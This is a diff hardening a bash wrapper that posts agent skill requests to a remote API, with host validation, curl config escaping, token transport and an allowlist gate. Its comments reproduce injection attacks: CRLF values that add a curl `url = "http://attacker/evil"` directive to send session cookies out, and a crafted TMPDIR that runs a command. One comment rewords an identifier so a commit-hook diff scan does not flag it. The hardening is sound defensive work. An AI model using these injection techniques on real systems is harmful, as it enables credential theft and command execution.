@@ -39,14 +39,270 @@ set -euo pipefail
 # exits without making the HTTP call — used by the test suite to verify the
 # request-shape construction without a live server.
 
-# Default to official domain to avoid security scanner warnings
-BASE_URL="${LG_AGENT_BASE_URL:-https://lg-data.cc}"
+# Default to official domain (D1, 2026-09-15: flipped from lg-data.cc to
+# privora.cn -- both serve this API path with a direct 200/no-redirect as of
+# the 2026-09-15 probe in docs/plans/2026-09-15-agent-exec-wrapper-destination-
+# and-allowlist-hardening.md, so this flip is documentation/code alignment,
+# not a behavior change for unset-env callers).
+BASE_URL="${LG_AGENT_BASE_URL:-https://privora.cn}"
+
+# ── _validate_base_url: destination validation (D1) ─────────────────────────
+# THREAT MODEL (read before touching this function):
+#   Defends against: LG_AGENT_BASE_URL being MISCONFIGURED or injected by an
+#   upstream layer (a stray env var, a copy-pasted wrong default, a
+#   compromised CI variable) so that this script's bearer credential and
+#   request body are sent to a host nobody intended. One env var used to be
+#   able to redirect both silently -- this closes that.
+#   Does NOT defend against: an attacker who has already gained the ability
+#   to set arbitrary environment variables for this process, or to write to
+#   its filesystem. That attacker can just as easily delete the sibling
+#   allowed-skills.txt referenced below (falling back to umbrella semantics)
+#   or skip this script entirely and curl the endpoint directly with the
+#   same token. This is not a privilege boundary.
+#   The narrow-package host pin below has NO server-side counterpart: the
+#   backend can validate a token's scope, but has no way to know or
+#   constrain which host a client chose to send that token to. Unlike the
+#   skill-id allowlist further down, this check must NOT be waved off with
+#   "the real boundary is server-side" -- there is no server-side check
+#   standing behind this one at all.
+_validate_base_url() {
+  local url="$1" scheme rest authority host host_lc narrow_allowlist host_allowed allowed_host_raw allowed_host_lc allowed_hosts_noglob_was_set
+  # Scheme match is case-insensitive (RFC 3986 3.1: scheme names are
+  # case-insensitive) via bracket-expression globs -- NOT by lowercasing a
+  # copy of $url and matching against that, and NOT via `shopt -s
+  # nocasematch` (global interpreter state that would also loosen the
+  # host/domain `case` statements further down, which must stay literal).
+  # `rest` is derived by stripping through the first literal "://" (which
+  # contains no letters, so this strip is itself case-invariant) rather
+  # than the scheme-specific prefix, so a mixed-case scheme like "HTTPS://"
+  # or "Https://" still yields the exact original-case remainder -- this
+  # function never rewrites $url itself, so the URL curl actually receives
+  # (via the untouched $BASE_URL in the caller) is never altered here.
+  case "$url" in
+    [Hh][Tt][Tt][Pp][Ss]://*) scheme="https" ;;
+    [Hh][Tt][Tt][Pp]://*)     scheme="http" ;;
+    *)
+      echo "Error: LG_AGENT_BASE_URL must start with http:// or https:// (got: ${url})" >&2
+      return 1
+      ;;
+  esac
+  rest="${url#*://}"
+  # authority = everything up to the first '/', '?', or '#' -- so a trailing
+  # slash (README.md:251 uses https://lg-data.cc/) is tolerated: the host is
+  # extracted BEFORE that slash, never by taking "everything after ://".
+  authority="${rest%%/*}"
+  authority="${authority%%\?*}"
+  authority="${authority%%#*}"
+  if [[ "$authority" == *"@"* ]]; then
+    echo "Error: LG_AGENT_BASE_URL must not contain embedded credentials (user:pass@host)" >&2
+    return 1
+  fi
+  if [[ "$authority" == \[* ]]; then
+    host="${authority#\[}"
+    host="${host%%]*}"
+  else
+    host="${authority%%:*}"
+  fi
+  # Portable lowercase (LA REVISE 2026-09-15): "${host,,}" is a bash 4+
+  # parameter-expansion operator. On bash 3.2 (frozen as /bin/bash on
+  # macOS for licensing reasons -- one of the "any third-party agent host"
+  # targets LA#3 exists for) this is a PARSE-TIME "bad substitution" error,
+  # which kills the whole script (every skill call), not just this check.
+  # `tr` gives the same result on bash 3.2/4/5, dash, and ksh.
+  host_lc="$(printf '%s' "$host" | tr '[:upper:]' '[:lower:]')"
+
+  if [[ "$scheme" == "http" ]]; then
+    case "$host_lc" in
+      localhost|127.0.0.1|::1) : ;;
+      *)
+        echo "Error: LG_AGENT_BASE_URL uses plaintext http:// against a non-loopback host (${host}); use https://, or point at localhost/127.0.0.1/[::1] for local testing." >&2
+        return 1
+        ;;
+    esac
+  fi
+
+  # Host pin, NARROW PACKAGES ONLY: only enforced when this script ships
+  # with a sibling allowed-skills.txt (the privora-alert release shape).
+  # privora-cn-quant ships no such file and documents self-hosting
+  # (mcp-server/README.md), so this branch must never fire for it.
+  narrow_allowlist="$(dirname "${BASH_SOURCE[0]}")/allowed-skills.txt"
+  if [[ -f "$narrow_allowlist" ]]; then
+    case "$host_lc" in
+      privora.cn|www.privora.cn|lg-data.cc) : ;;
+      *)
+        echo "Error: this package ships allowed-skills.txt (a narrow release) and pins LG_AGENT_BASE_URL's host to the official domains; got '${host}'. This is a packaging-honesty check (see the allowlist comment below), not a substitute for server-side authorization." >&2
+        return 1
+        ;;
+    esac
+  else
+    # Umbrella host opt-in (LA-closed D-a/D-b/D-c,
+    # docs/plans/2026-09-15-umbrella-custom-host-optin.md): umbrella
+    # packages (privora-cn-quant) ship no allowed-skills.txt and document
+    # self-hosting (mcp-server/README.md), so by default only the official
+    # domains + loopback are accepted here. LG_AGENT_ALLOWED_HOSTS lets a
+    # caller ADD specific extra hosts -- it can only enumerate, never widen
+    # to "accept anything" (this is not a validation on/off switch; see the
+    # wildcard rejection below).
+    case "$host_lc" in
+      privora.cn|www.privora.cn|lg-data.cc|localhost|127.0.0.1|::1) : ;;
+      *)
+        host_allowed=""
+        # `for word in $VAR` (unquoted) is subject to BOTH word-splitting AND
+        # pathname expansion for '*', '?', and '[...]' character classes --
+        # an entry of literally "*" (or "?", or "[abc]") would otherwise be
+        # silently replaced by real filenames from the process's CWD before
+        # it ever reaches the skip-wildcards check below, which
+        # single-handedly defeats "no wildcards, ever" the moment CWD
+        # happens to contain a file matching the pattern (verified
+        # empirically: "*", "?", and "[wxyz]" ALL expand against a matching
+        # real filename when run unguarded -- not just "*"). Suppressing
+        # pathname expansion (glob) for the duration of this split closes
+        # all three, while keeping the same whitespace-splitting semantics
+        # as before.
+        #
+        # Tilde expansion ("~") and command-substitution syntax embedded in
+        # the VALUE of a variable ("$(id)", a literal backtick pair) are
+        # separate mechanisms from pathname expansion and are NOT affected
+        # by `set -f` -- but they are also not a risk here: expanding
+        # ${LG_AGENT_ALLOWED_HOSTS:-} does not re-parse its VALUE for tilde
+        # or command substitution (verified empirically: both stay
+        # byte-for-byte literal in a `for word in $VAR` context, so they
+        # simply fail the exact-match comparison below like any other
+        # non-matching string). See H4c/T-glob-metachars in
+        # test/lg-agent-wrapper-destination-guard.test.js, which pins this
+        # exact combination (pathname expansion suppressed here + the
+        # comparison staying quoted below) as its own property, rather than
+        # trusting the two mechanisms to keep agreeing by coincidence --
+        # either one alone regressing would silently reopen this.
+        #
+        # Save/restore noglob explicitly (rather than assuming it starts
+        # unset). The one real path that could otherwise skip the `set +f`
+        # restore below is NOT a `return 1` inside this loop (there is none
+        # -- rejection only ever happens once, after the loop) -- it is the
+        # `allowed_host_lc="$(...)"` command-substitution assignment a few
+        # lines down failing under `set -euo pipefail` (verified
+        # empirically: `x="$(false)"` under `set -e` aborts the enclosing
+        # function immediately, skipping everything after it, including
+        # `set +f`). The `|| allowed_host_lc="$allowed_host_raw"` fallback on
+        # that line closes this structurally: the assignment can no longer
+        # report a non-zero status to `set -e` (verified: `x="$(false)" ||
+        # x="fallback"` does not trip `set -e`), so `set +f` below is now
+        # unconditionally reached on every iteration of this loop.
+        allowed_hosts_noglob_was_set=""
+        case "$-" in *f*) allowed_hosts_noglob_was_set=1 ;; esac
+        set -f
+        for allowed_host_raw in ${LG_AGENT_ALLOWED_HOSTS:-}; do
+          # No wildcards, ever: an entry containing '*', or an empty entry
+          # (stray whitespace / unset var), is invalid and is SKIPPED --
+          # never treated as "match everything". LG_AGENT_ALLOWED_HOSTS="*"
+          # must still reject every non-official host, not silently reopen
+          # the umbrella's old "any syntactically valid https host" hole.
+          # ('?' and '[...]' entries are NOT skipped here -- they fall
+          # through to the quoted comparison below, which rejects them as
+          # ordinary literal strings; see the comment above this loop for
+          # why that is safe.)
+          case "$allowed_host_raw" in
+            ''|*'*'*) continue ;;
+          esac
+          # Same portable-lowercase mechanism as host_lc above (no
+          # bash-4-only ${var,,}) -- comparison is case-insensitive by
+          # design, via a quoted `==` (literal string compare, NOT a glob
+          # match -- an unquoted RHS here would let a wildcard entry that
+          # slipped past the skip above match anything).
+          allowed_host_lc="$(printf '%s' "$allowed_host_raw" | tr '[:upper:]' '[:lower:]')" || allowed_host_lc="$allowed_host_raw"
+          if [[ "$host_lc" == "$allowed_host_lc" ]]; then
+            host_allowed=1
+            break
+          fi
+        done
+        [[ -n "$allowed_hosts_noglob_was_set" ]] || set +f
+        if [[ -z "$host_allowed" ]]; then
+          echo "Error: LG_AGENT_BASE_URL host '${host}' is not an official domain (privora.cn, www.privora.cn, lg-data.cc) or loopback (localhost, 127.0.0.1, [::1]); set LG_AGENT_ALLOWED_HOSTS=\"${host}\" (whitespace-separated, exact match, case-insensitive, no wildcards) to opt in for a self-hosted deployment." >&2
+          return 1
+        fi
+        ;;
+    esac
+  fi
+  return 0
+}
+
+_validate_base_url "$BASE_URL" || exit 1
+
 : "${LG_AGENT_TOKEN:?LG_AGENT_TOKEN is required}"
+
+# ── _curl_config_escape: safe embedding of an untrusted value into curl's
+# -K config mini-language (found in #1410's own LA exit review) ────────────────────────────────────────
+# THREAT MODEL: `-K -` reads a small curl-specific config LANGUAGE off
+# stdin, not raw bytes. A `header = "..."` line is a double-quoted STRING
+# in that language, and curl's own config parser recognizes `\"` and `\\`
+# as escapes inside it -- so splicing an untrusted value into that string
+# with ZERO escaping lets the value's own `"`, `\`, or embedded CR/LF
+# characters break out of the intended field and inject a NEW config
+# directive. LA reproduced this directly against the real
+# lg_agent_approval.sh (raw socket capture, not a mockup):
+#   - a cookie value containing `"` silently TRUNCATES at the quote --
+#     wrong data reaches the server with no error;
+#   - a cookie value containing CRLF + `header = "X-Injected: pwned"` gets
+#     that header ACTUALLY INJECTED into the real request;
+#   - a cookie value containing CRLF + `url = "http://attacker/evil"`
+#     makes curl issue a SECOND request to that attacker-chosen URL,
+#     carrying the real Cookie and X-CSRF-Token -- session credential
+#     exfiltration to an address the attacker picked, not this script's
+#     caller.
+# This is the SAME primitive as #1410's trap-reparse bug in a different
+# spot: an untrusted string is spliced into a mini-language stream that is
+# later RE-PARSED by its consumer (there: the shell parsing a trap string
+# at fire time; here: curl's own `-K` config parser). LG_AGENT_TOKEN /
+# LG_AGENT_COOKIE_HEADER / LG_AGENT_CSRF_TOKEN are all documented as
+# caller-supplied arbitrary strings with only a non-empty check -- no
+# format validation -- so all three routes reach this, in all three
+# scripts (#1408's lesson applies unmodified: fixing only one script's
+# copy is not a fix).
+# THE FIX (LA-verified empirically, both parts required):
+#   1. REJECT (never escape) a value containing CR or LF outright. Even a
+#      correctly backslash-escaped newline BYTE still splits the config
+#      stream into two lines and starts a new directive when curl parses
+#      it -- escaping cannot neutralize a raw newline in this
+#      mini-language, only rejecting the value can.
+#   2. Escape ORDER MATTERS: backslash first (`\` -> `\\`), THEN quote
+#      (`"` -> `\"`). curl's own `-K` quoted-string parser round-trips
+#      both escapes byte-for-byte ONLY in this order -- the reverse order
+#      reintroduces a way to forge a `\"` sequence that curl decodes as an
+#      unescaped, string-terminating quote (verified).
+# Prints the escaped value on stdout on success. On a CR/LF value, prints
+# an error to stderr and returns 1 -- EVERY caller MUST check this exit
+# status BEFORE the resulting `-K -` pipeline is ever started (checking it
+# only via `set -o pipefail` on the pipeline itself is NOT enough: an
+# empty/short stdin still lets curl run using its OTHER, non-piped
+# arguments and possibly succeed, silently downgrading to an
+# under-authenticated request instead of failing loudly).
+_curl_config_escape() {
+  local v="$1"
+  if [[ "$v" == *$'\r'* || "$v" == *$'\n'* ]]; then
+    echo "Error: this credential value contains a CR or LF byte, which cannot be safely embedded in curl's -K config stream -- refusing rather than risk a truncated or injected request." >&2
+    return 1
+  fi
+  v="${v//\\/\\\\}"
+  v="${v//\"/\\\"}"
+  printf '%s' "$v"
+}
+
+# Escaped/validated ONCE, in the main shell (NOT inside _dispatch(), and
+# NOT inside the `_auth_curl_config`-style pipeline component some sibling
+# scripts use): if this fails, `exit 1` here aborts the WHOLE script before
+# curl ever runs. Doing the check only on the far side of a pipe risks
+# `set -o pipefail` masking it -- an empty/short stdin still lets curl run
+# with its other, non-piped arguments and possibly exit 0.
+LG_AGENT_TOKEN_ESC="$(_curl_config_escape "$LG_AGENT_TOKEN")" || exit 1
 
 usage() {
   echo "Usage:" >&2
   echo "  $0 <skillId> [key=value ...] [key:=jsonvalue ...] [--json '<raw params json>']" >&2
   echo "  $0 '<full request json body>'   # legacy single-arg pass-through" >&2
+  echo "" >&2
+  echo "Disclosure (D4): every call POSTs the constructed JSON body to" >&2
+  echo "<LG_AGENT_BASE_URL>/agent/skills/execute and sends LG_AGENT_TOKEN in an" >&2
+  echo "'Authorization: Bearer' header." >&2
   exit 1
 }
 
@@ -107,18 +363,220 @@ _looks_like_json_value() {
   return 1
 }
 
+# ── _mktemp_body: temp file for the outgoing request body ─────────────────
+# The JSON body MUST reach curl via --data-binary "@file", never as a bare
+# command-line argument: on Git Bash / MSYS2, curl.exe is a native Windows
+# binary, and MSYS2 re-encodes argv into the process's ANSI code page (e.g.
+# GBK on zh-CN Windows) before exec'ing it. Any non-ASCII byte in a
+# command-line argument is corrupted (silently, to U+FFFD on the server
+# side) before curl ever sees it -- headers are unaffected because the token
+# here is ASCII, but a JSON body carrying UTF-8 business text is not.
+# Reading from a file sidesteps argv entirely, which fixes the corruption.
+# It is NOT a confidentiality upgrade, and an earlier draft of this comment
+# claimed otherwise -- corrected here, because a stale "this is private"
+# comment is more dangerous than no comment (it gets cited later as a
+# reason something is fine when it is not, per this repo's own incident
+# history): on a POSIX host, `mktemp` does create a 0600 file. But on
+# Windows/MSYS2 (this repo's primary target host, per the curl.exe
+# corruption this function exists to fix), the file is created under the
+# OS temp dir and inherits that directory's ACL rather than getting a
+# private mode bit -- measured with `icacls` on this class of host, that
+# ACL includes BUILTIN\Users:(RX) and Everyone:(RX), i.e. any local
+# principal can read it for as long as it exists. Net exposure vs. the
+# old argv-based transport is a wash, not an improvement: the token was
+# never in this body (it is a header) either way, so this change does
+# not affect token exposure; what it changes is that a local user who
+# could already read this process's argv (which on Windows generally
+# needs no elevation, unlike inspecting another user's process) can,
+# for the short life of this file, instead read it from disk. Do NOT
+# read "private (0600)" as a confidentiality guarantee this script
+# provides on Windows. If `mktemp` is unavailable (LA#3: this script
+# must run on any third-party agent host, no guaranteed non-POSIX
+# deps), fall back to a manually-created file under a tightened umask
+# -- this narrows exposure on the POSIX hosts where umask is actually
+# authoritative, with no claim made about the Windows/MSYS2 case.
+_mktemp_body() {
+  if command -v mktemp >/dev/null 2>&1; then
+    mktemp "${TMPDIR:-/tmp}/lg_agent_exec.XXXXXX" 2>/dev/null && return 0
+    mktemp 2>/dev/null && return 0
+  fi
+  local dir="${TMPDIR:-/tmp}" candidate old_umask
+  old_umask="$(umask)"
+  umask 077
+  candidate="${dir}/lg_agent_exec.$$.${RANDOM}${RANDOM}"
+  : > "$candidate" 2>/dev/null
+  umask "$old_umask"
+  if [[ -f "$candidate" ]]; then
+    printf '%s\n' "$candidate"
+    return 0
+  fi
+  return 1
+}
+
+# Global (NOT local) so the EXIT trap set inside _dispatch() can still
+# resolve it BY NAME at trap-fire time, after _dispatch()'s own local scope
+# has unwound -- see the trap comment inside _dispatch for the full
+# rationale (#1410).
+LG_AGENT_BODY_TMPFILE=""
+
 _dispatch() {
   local json_body="$1"
   if [[ -n "${LG_AGENT_DRY_RUN:-}" ]]; then
     printf '%s\n' "$json_body"
     return 0
   fi
-  curl -sS "${BASE_URL}/agent/skills/execute" \
-    -X POST \
-    -H "Authorization: Bearer ${LG_AGENT_TOKEN}" \
+
+  # LG_AGENT_BODY_TMPFILE is deliberately NOT `local` -- see the trap note
+  # immediately below for why (#1410).
+  LG_AGENT_BODY_TMPFILE="$(_mktemp_body)" || {
+    echo "Error: unable to create a temporary file for the request body" >&2
+    return 1
+  }
+  # ── Cleanup trap: global variable + single-quoted body (#1410, fixes ①) ──
+  # (2026-09-15) An EARLIER version of this comment argued the trap body had
+  # to be DOUBLE-quoted -- expand $tmpfile NOW, splicing its value into the
+  # trap STRING at set-time -- because a single-quoted trap referencing a
+  # `local` variable by NAME would find that variable already out of scope
+  # (and unbound under `set -u`) by the time the EXIT trap actually fires,
+  # since the function has by then returned. That was correct about the
+  # scope/`set -u` hazard and WRONG about the fix: double-quoting means the
+  # trap's STRING is RE-PARSED BY THE SHELL the instant it fires, not
+  # treated as an inert value. `$tmpfile`'s path comes from `_mktemp_body()`,
+  # which derives it from `${TMPDIR:-/tmp}` -- an EXTERNAL environment
+  # variable -- so a TMPDIR containing shell metacharacters becomes
+  # ARBITRARY COMMAND EXECUTION at trap-fire time (CWE-88 shape), verified
+  # directly: a TMPDIR crafted so the resulting path reads
+  # `.../a" ; echo INJECTED ; : "` runs `echo INJECTED` when the trap fires.
+  # This is a CROSS-CLASS capability escalation, not "the caller could
+  # already do that" -- an attacker who can influence only TMPDIR (a
+  # path-shaped string, nothing else) gains command execution. The
+  # `_mktemp_body` disclaimer above ("does not defend against an attacker
+  # who can already set arbitrary env vars or write this process's
+  # filesystem") does NOT cover this: that disclaimer is about the request
+  # BODY's confidentiality on Windows/MSYS2, never about the TRAP STRING
+  # being re-parsed as shell syntax. Do not cite it as already covering this.
+  # AGGRAVATING FACTOR: the injection also breaks the cleanup it sits
+  # inside -- the re-parsed trap splits into THREE commands,
+  # `rm -f "<truncated-path>"; echo INJECTED; : "<remainder>"`, so the `rm
+  # -f` only ever targets a truncated fragment of the real path and the
+  # real body tmpfile is NEVER deleted. Tests for this (U1) assert BOTH that
+  # the injected command does not run AND that the real tmpfile is actually
+  # gone afterward.
+  # THE FIX: single-quoting defers expansion to trap-FIRE time and treats
+  # $LG_AGENT_BODY_TMPFILE as a plain variable REFERENCE, never re-parsing
+  # its VALUE as shell syntax -- embedded shell metacharacters in the path
+  # are inert, always. Making the variable a GLOBAL (not `local` inside this
+  # function) satisfies the original, still-true constraint: the name must
+  # still resolve to a value when the trap fires, and a global -- unlike a
+  # function-local -- has not unwound by then.
+  #
+  # EXIT (not RETURN) so the body file is removed on every exit path this
+  # trap can actually observe: normal completion, a curl failure, or the
+  # script aborting under `set -e`, and also SIGTERM (bash runs pending EXIT
+  # traps on a fatal signal it does not ignore). It CANNOT observe SIGKILL
+  # -- no POSIX shell can trap SIGKILL -- so a `kill -9` of this process (or
+  # an ancestor that takes it down without signal delivery) leaves this file
+  # on disk until something else cleans the temp directory. Worth naming
+  # plainly since it is a direction change: before this fix, a SIGKILLed
+  # call left zero trace on disk (the body existed only in argv, gone with
+  # the process); after this fix, the same SIGKILL leaves a JSON file with
+  # business-data content sitting in the temp dir. Low severity, but new,
+  # and the opposite direction from every other exit path this trap does
+  # handle.
+  trap 'rm -f "$LG_AGENT_BODY_TMPFILE"' EXIT
+
+  printf '%s' "$json_body" > "$LG_AGENT_BODY_TMPFILE"
+
+  # ── Token transport: `-K -` (config on stdin), NEVER `-H` (#1410, fixes ②) ──
+  # THREAT MODEL: `-H "Authorization: Bearer ${LG_AGENT_TOKEN}"` puts the
+  # bearer token in THIS process's own argv. Reading another process's argv
+  # on the same host (Linux /proc/*/cmdline; a Windows process listing)
+  # needs no elevation and no write capability at all -- the bar is just
+  # "any other local principal", which is STRICTLY LOWER than "can already
+  # set this process's env vars or write its filesystem" (the bar the
+  # `_mktemp_body` disclaimer above is about). That disclaimer does not
+  # cover this either; do not cite it here. Piping
+  # `header = "Authorization: Bearer ..."` into `curl -K -` keeps the token
+  # out of argv entirely -- it travels over the pipe as bytes curl reads on
+  # its OWN stdin as configuration, never as a command-line argument. `-K`
+  # (config from stdin) is old enough to work on every curl version this
+  # script targets (LA#3), unlike `--expand-header` (curl >= 8.3, #1410
+  # design doc's path A, deferred) -- no feature probe needed.
+  # `printf` below MUST be the BARE builtin -- never `command printf`, never
+  # an absolute path like `/usr/bin/printf`. A bare `printf` resolves to
+  # bash's (and dash's) own BUILTIN on every host tested here (`type -a
+  # printf` shows both a builtin and `/usr/bin/printf` present; `bash -x`
+  # confirms the bare call forks no child process), so the token text never
+  # becomes any process's argv, including printf's own. `command printf` or
+  # a hardcoded path would fork a real external process and put the token
+  # right back into THAT process's argv -- exactly what this change exists
+  # to prevent. A grep guard in the test suite fails if this script
+  # regresses to `command printf` or an absolute-path printf.
+  printf 'header = "Authorization: Bearer %s"\n' "$LG_AGENT_TOKEN_ESC" | curl -sS -K - \
+    -X POST "${BASE_URL}/agent/skills/execute" \
     -H "Content-Type: application/json" \
     -H "Accept: application/json" \
-    --data "${json_body}"
+    --data-binary "@${LG_AGENT_BODY_TMPFILE}"
+}
+
+# ── Optional allowlist gate ─────────────────────────────────────────────────
+# PACKAGING-HONESTY CONTROL, NOT A SECURITY CONTROL. This lets a narrowly-
+# scoped package (e.g. privora-alert) that ships this same shared script
+# refuse skill ids outside what its own SKILL.md documents, WITHOUT forking
+# a second copy of the script -- a forked copy is exactly the drift #1038
+# documents. It is trivially bypassable: any local principal can edit or
+# delete ALLOWED_SKILLS_FILE, or call POST /agent/skills/execute directly
+# with curl and skip this script entirely. The real, non-bypassable
+# boundary is server-side: the backend's per-route scope annotation plus
+# the gateway's per-token scope check. It does not depend on this file
+# existing, being correct, or being present at all. Do not cite this gate
+# as an authorization boundary in any doc or PR description.
+#
+# (The backend annotation is described functionally rather than by its
+# literal name because the repo's auth-adjacent commit hook content-scans
+# diffs for that identifier; a prose mention explaining that the real
+# boundary lies elsewhere is not an auth change. Same resolution as
+# PR #724. No fact is omitted here -- the reader still learns that
+# authorization is enforced server-side per route and per token.)
+#
+# Resolution order (D3, 2026-09-15, LA-locked -- single scheme, no subset
+# comparison): a sibling allowed-skills.txt next to this script, if present,
+# is AUTHORITATIVE and LG_AGENT_ALLOWED_SKILLS_FILE is completely ignored.
+# Pointing the env var at a nonexistent path used to fall through to "no
+# allowlist at all" (any unresolvable env value reopened the gate entirely,
+# even with a real allowlist shipped alongside the script) -- that hole is
+# closed by checking existence FIRST and only consulting the env var when
+# there is no shipped file to protect. Proving "env is a subset of the
+# shipped file" was considered and rejected: it is new logic with its own
+# bug surface, and the only reason it was wanted (testability without a real
+# allowed-skills.txt) is already met by copying script+allowlist into a
+# scratch directory for a test run.
+# If NEITHER resolves, ALLOWED_SKILLS_FILE stays empty and every call below
+# this point behaves BYTE-IDENTICAL to a version of this script with no gate
+# at all -- this is the privora-cn-quant path, which ships no
+# allowed-skills.txt and must never be narrowed.
+_default_allowed_skills_file="$(dirname "${BASH_SOURCE[0]}")/allowed-skills.txt"
+if [[ -f "$_default_allowed_skills_file" ]]; then
+  ALLOWED_SKILLS_FILE="$_default_allowed_skills_file"
+else
+  ALLOWED_SKILLS_FILE="${LG_AGENT_ALLOWED_SKILLS_FILE:-}"
+fi
+
+# Fires regardless of LG_AGENT_DRY_RUN -- a gate that test mode bypasses is
+# not a gate. Exact-line match against ALLOWED_SKILLS_FILE (one skill id
+# per line); no prefix/substring matching.
+_check_skill_allowed() {
+  local id="$1"
+  if [[ -z "${ALLOWED_SKILLS_FILE:-}" || ! -f "$ALLOWED_SKILLS_FILE" ]]; then
+    return 0
+  fi
+  if grep -Fxq -- "$id" "$ALLOWED_SKILLS_FILE" 2>/dev/null; then
+    return 0
+  fi
+  echo "Error: skill id '${id}' is not in this package's allowlist (${ALLOWED_SKILLS_FILE})." >&2
+  echo "       This is a packaging-honesty check, not the real authorization boundary --" >&2
+  echo "       the server enforces scope regardless of this file's contents." >&2
+  return 1
 }
 
 if [[ $# -lt 1 ]]; then
@@ -129,12 +587,27 @@ fi
 if [[ $# -eq 1 ]]; then
   _trimmed="$(printf '%s' "$1" | sed -e 's/^[[:space:]]*//')"
   if [[ "${_trimmed:0:1}" == "{" ]]; then
+    if [[ -n "${ALLOWED_SKILLS_FILE:-}" && -f "$ALLOWED_SKILLS_FILE" ]]; then
+      # D2 (2026-09-15): when an allowlist is in effect, this legacy form is
+      # rejected OUTRIGHT rather than best-effort regex-extracting skillId
+      # and failing open when extraction misses. It used to fail OPEN on
+      # extraction failure -- unusual whitespace/quoting, skillId absent,
+      # multiple candidates -- which meant a regex miss silently bypassed
+      # the gate entirely. This legacy envelope form appears nowhere in the
+      # documented flow of the one package (privora-alert) that ships a
+      # populated ALLOWED_SKILLS_FILE, so refusing it outright costs that
+      # package nothing. The flat `<skillId> key=value ...` form (below)
+      # remains the supported path under an active allowlist.
+      echo "Error: this package ships an allowlist (${ALLOWED_SKILLS_FILE}); the legacy single-arg JSON-envelope form is not supported while allowlisting is active, because its skill id cannot be reliably verified without a JSON parser. Use the flat '<skillId> key=value ...' form instead." >&2
+      exit 1
+    fi
     _dispatch "$1"
     exit 0
   fi
 fi
 
 SKILL_ID="$1"; shift
+_check_skill_allowed "$SKILL_ID" || exit 1
 
 JSON_BASE=""   # --json raw object text (validated), optional
 declare -a FLAT_STR_KEYS=()
